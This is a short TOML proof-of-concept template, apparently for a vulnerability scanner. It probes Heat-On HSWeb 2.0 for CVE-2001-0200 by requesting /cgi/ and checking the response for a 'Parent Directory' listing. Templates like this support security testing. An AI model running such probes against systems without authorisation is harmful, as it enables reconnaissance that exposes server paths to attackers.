[info]
author = "ave"
description = "验证 Heat-On HSWeb Web Server 2.0 在 /cgi/ 目录的物理路径泄露漏洞，当目录浏览功能启用时，远程攻击者可通过请求获取服务器物理路径"
id = "POC-AVE-2001-0078"
name = "CVE-2001-0200 Heat-On HSWeb 路径泄露 PoC"
severity = "medium"
tags = ["ave-2001-0078"]
vuln_id = [
    "CVE-2001-0200",
    "AVE-2001-0078",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Parent Directory"]
